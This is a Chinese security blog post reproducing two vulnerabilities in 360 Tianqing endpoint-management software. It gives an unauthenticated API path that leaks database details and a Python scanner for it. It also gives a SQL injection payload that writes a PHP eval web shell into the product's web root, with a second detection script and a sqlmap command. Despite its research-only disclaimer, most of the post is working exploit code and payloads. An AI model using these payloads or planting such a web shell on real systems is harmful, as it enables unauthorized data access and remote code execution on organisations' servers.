> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/udn2lt7x_2IY7jD872vflQ)

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcPO7Gtxz7NJKT1GzOCbmVVCS19U2mdiaLDhicIN3SeoQU9KIlK0R5F0RVgzvcoFiawsBxTojPAVoXBg/640?wx_fmt=png)

天擎_越权访问 & 天擎_前台 sql 注入复现

一、天擎_越权访问

POC：  

```
GET /api/dbstat/gettablessize HTTP/1.1
```

直接访问可获取数据库相关信息：  

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcPO7Gtxz7NJKT1GzOCbmVV4HcqeFNfia1qFcNLl06aCT0HXMuMcwHlg4YGsVhceJW2c3GhmiaDmhSg/640?wx_fmt=png)

脚本：  

python3 poc.py http://ip+port

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcPO7Gtxz7NJKT1GzOCbmVVXk1ulBrTYjeJnMcVTYfAhFhIBjxtwicWycXLw0Uuos2yYvwNK4yZtIQ/640?wx_fmt=png)

```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 360天擎未授权访问
referer: 360天擎未授权访问 IP:port/api/dbstat/gettablessize
author: thelostworld
description: 360天擎未授权访问。
免责声明：本站提供安全工具、程序(方法)可能带有攻击性，仅供安全研究与教学之用，风险自负!
'''
import sys
import warnings
import requests
import click
from concurrent.futures import ThreadPoolExecutor

W = '\033[0m'
G = '\033[1;32m'
R = '\033[1;31m'
O = '\033[1;33m'
B = '\033[1;34m'


def run(url):
    result = ['','不存在']
    payload = "/api/dbstat/gettablessize"
    vulnurl = url + payload
    if("http" in vulnurl):
        vulnurl = vulnurl
    else:
        vulnurl = "http://" + vulnurl
    try:
        req = requests.get(vulnurl,timeout=1, verify=False)
        if r"schema_name" in req.text :
            result[1] = '存在'
            result[0] = vulnurl
            print(G,result[1]+result[0]+'\r\n'+req.text,W)
        else:
            result[1] = '不存在'
    except:
        result[1] = '不存在'
    return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
```

二、天擎_前台 sql 注入

poc：

```
/api/dp/rptsvcsyncpoint?ccid=1';create table O(T TEXT);insert into O(T) values('<?php @eval($_POST[1]);?>');copy O(T) to 'C:\Program Files (x86)\360\skylar6\www\1.php';drop table O;--
```

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcPO7Gtxz7NJKT1GzOCbmVVqXC3GF1HxUIOBEMo9O85lqyKUtZVSD2ujDJx9k8hOLP7cictu08UguQ/640?wx_fmt=png)

sqlmap 执行：

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcPO7Gtxz7NJKT1GzOCbmVVj5nSibllt3kSqT9EwkuAWLQ4qibQDnjQURc3R0eRtIGCQ96HoicrkxJnQ/640?wx_fmt=png)

脚本：  

python3 poc.py http://ip+port

```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 360天擎SQL注入
referer: 360天擎SQL注入 IP:port/api/dp/rptsvcsyncpoint?ccid=1';create table O(T TEXT);insert into O(T) values('<?php @eval($_POST[1]);?>');copy O(T) to 'C:\Program Files (x86)\360\skylar6\www\1.php';drop table O;-- 
author: thelostworld
description: 360天擎SQL注入。
免责声明：本站提供安全工具、程序(方法)可能带有攻击性，仅供安全研究与教学之用，风险自负!
'''
import sys
import warnings
import requests
import click
from concurrent.futures import ThreadPoolExecutor

W = '\033[0m'
G = '\033[1;32m'
R = '\033[1;31m'
O = '\033[1;33m'
B = '\033[1;34m'

def run(url):
    result = ['','不存在']
    payload = "/api/dp/rptsvcsyncpoint?ccid=1*"
    headers = { "Upgrade-Insecure-Requests": "1", 
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36", 
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
                "Accept-Encoding": "gzip, deflate", 
                "Accept-Language": "zh-CN,zh;q=0.9", 
                "Connection": "close"
        }
    vulnurl = url + payload
    if("http" in vulnurl):
        vulnurl = vulnurl
    else:
        vulnurl = "http://" + vulnurl
    try:
        req = requests.get(vulnurl, headers=headers, timeout=3, verify=False)
        if r"success" in req.text :
            result[1] = '存在'
            result[0] = vulnurl + '需要进一步验证,SQLMAP语法:sqlmap.py -u "%s" --dbms PostgreSQL --batch'%(vulnurl)
            print(G,result[0],W)
        else:
            result[1] = '不存在'
    except:
        result[1] = '不存在'
    return result
    
if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
```

免责声明：本站提供安全工具、程序 (方法) 可能带有攻击性，仅供安全研究与教学之用，风险自负!

转载声明：著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。

订阅查看更多复现文章、学习笔记

thelostworld

安全路上，与你并肩前行！！！！

![](https://mmbiz.qpic.cn/mmbiz_jpg/uljkOgZGRjeUdNIfB9qQKpwD7fiaNJ6JdXjenGicKJg8tqrSjxK5iaFtCVM8TKIUtr7BoePtkHDicUSsYzuicZHt9icw/640?wx_fmt=jpeg)

个人知乎：https://www.zhihu.com/people/fu-wei-43-69/columns

个人简书：https://www.jianshu.com/u/bf0e38a8d400

个人 CSDN：https://blog.csdn.net/qq_37602797/category_10169006.html

个人博客园：https://www.cnblogs.com/thelostworld/

FREEBUF 主页：https://www.freebuf.com/author/thelostworld?type=article

语雀博客主页：https://www.yuque.com/thelostworld

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcW6VR2xoE3js2J4uFMbFUKgglmlkCgua98XibptoPLesmlclJyJYpwmWIDIViaJWux8zOPFn01sONw/640?wx_fmt=png)

欢迎添加本公众号作者微信交流，添加时备注一下 “公众号”  

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcSQn373grjydSAvWcmAgI3ibf9GUyuOCzpVJBq6z1Z60vzBjlEWLAu4gD9Lk4S57BcEiaGOibJfoXicQ/640?wx_fmt=png)